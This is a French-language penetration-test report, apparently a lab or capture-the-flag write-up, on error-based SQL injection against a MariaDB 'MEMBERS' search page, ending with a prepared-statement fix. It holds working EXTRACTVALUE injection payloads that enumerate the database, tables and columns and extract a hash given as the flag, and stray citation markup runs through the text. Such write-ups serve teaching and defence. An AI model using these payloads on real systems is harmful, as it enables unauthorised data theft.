# Rapport de Pentest : SQL Injection (Error Based)

## 1. Description de la vulnérabilité
* [cite_start]**Cible :** Page `MEMBERS`[cite: 39].
* [cite_start]**Vecteur d'attaque :** Champ de recherche numérique (`id`)[cite: 43].
* [cite_start]**Type de faille :** SQL Injection (Error Based - MariaDB)[cite: 39, 42].

### Analyse du contournement
[cite_start]Lors de la phase de détection, l'utilisation d'une simple apostrophe `'` a provoqué une erreur de syntaxe révélant un échappement via un backslash `\`[cite: 39]. [cite_start]La vulnérabilité a été exploitée en injectant des commandes SQL sans utiliser d'apostrophes, car le système ne filtre pas les entrées numériques avant de les envoyer à la base de données[cite: 43].

---

## 2. Étapes d'exploitation et Preuves

### Étape 1 : Détection de la faille
[cite_start]L'objectif était de prouver que le champ de recherche interagit directement avec la base de données sans filtre[cite: 38].
* [cite_start]**Payload utilisé :** `'`[cite: 39].
* [cite_start]**Résultat :** Affichage d'une erreur de syntaxe SQL MariaDB[cite: 39].
* **Preuve visuelle :** `screenshots/1. Preuve de la vulnérabilité (Détection).png`.

### Étape 2 : Énumération de la Base de Données
[cite_start]Extraction du nom de la base de données via la fonction `EXTRACTVALUE` qui force l'affichage de données dans un message d'erreur XPATH[cite: 42, 48].
* [cite_start]**Payload :** `1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e))`[cite: 44].
* [cite_start]**Résultat :** `Member_Sql_Injection`[cite: 51].
* **Preuve visuelle :** `screenshots/2. Énumération de la Base de Données.png`.

### Étape 3 : Énumération des Tables
[cite_start]Identification des tables présentes dans la base de données identifiée[cite: 52].
* [cite_start]**Payload :** `1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1), 0x7e))`[cite: 54].
* [cite_start]**Résultat :** Table `users` identifiée[cite: 57].
* **Preuve visuelle :** `screenshots/3. Énumération de la Table.png`.

### Étape 4 : Énumération des Colonnes (Méthode par Offset)
[cite_start]L'affichage étant limité à un résultat par erreur, nous avons utilisé la clause `OFFSET` pour lister les colonnes une par une[cite: 64]. [cite_start]Après avoir exploré les colonnes `user_id` [cite: 63][cite_start], `first_name` [cite: 66][cite_start], `last_name` [cite: 68][cite_start], `town` [cite: 71][cite_start], `country` [cite: 73][cite_start], `planet` [cite: 75] [cite_start]et `Commentaire`[cite: 77], nous avons trouvé la colonne cible à l'Offset 7.
* [cite_start]**Payload (Offset 7) :** `1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT column_name FROM information_schema.columns WHERE table_name=0x7573657273 LIMIT 1 OFFSET 7), 0x7e))`[cite: 79].
* [cite_start]**Résultat :** Colonne `countersign` identifiée[cite: 79].
* **Preuve visuelle :** `screenshots/4. Énumération des Colonnes (Le pivot).png`.

### Étape 5 : Extraction du Flag Final
Extraction du contenu (hash) stocké dans la colonne `countersign`.
* **Payload :** `1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT substring(countersign, 1, 64) FROM users LIMIT 1), 0x7e))`.
* **Résultat (Flag) :** `2b3366bcfd44f540e630d4dc2b9b06d9`.
* **Preuve visuelle :** `screenshots/5. Extraction finale du Flag.png`.

---

## 3. Remédiation (Correctif)
[cite_start]Pour corriger cette faille, il est impératif de ne plus concaténer les entrées utilisateur directement dans les requêtes SQL[cite: 5].

**Solution recommandée :**
Utiliser des **requêtes préparées** (Prepared Statements) qui séparent la structure de la requête SQL des données fournies par l'utilisateur.

```php
// Exemple de remédiation en PHP (PDO)
$stmt = $pdo->prepare('SELECT * FROM users WHERE user_id = :id');
$stmt->execute(['id' => $_GET['id']]);
$user = $stmt->fetch();
